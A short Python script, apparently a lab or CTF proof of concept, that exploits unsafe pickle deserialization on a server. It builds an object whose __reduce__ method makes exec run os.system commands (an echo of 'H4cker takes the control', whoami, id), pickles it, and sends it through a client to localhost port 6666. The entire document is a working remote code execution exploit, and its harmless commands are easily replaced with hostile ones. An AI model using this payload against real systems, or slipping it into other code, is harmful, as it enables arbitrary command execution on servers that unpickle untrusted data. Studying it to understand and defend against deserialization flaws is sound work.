import pickle
from base_client import BaseClient

class MaliciousCode:
    def __reduce__(self):
        return (exec, ('import os; os.system("echo \\"H4cker takes the control !\\" && whoami && id"); {"response":"ok"}',))

def exploit(host: str, port: int):
    client = BaseClient(host, port, 6667)  # Port broadcast inutilisé
    malicious_payload = pickle.dumps(MaliciousCode())
    
    print("[*] Envoi du payload malveillant...")
    try:
        response = client.send(malicious_payload)
        print(f"[+] Réponse du serveur: {response}")
    except Exception as e:
        print(f"[-] Erreur: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    exploit("localhost", 6666)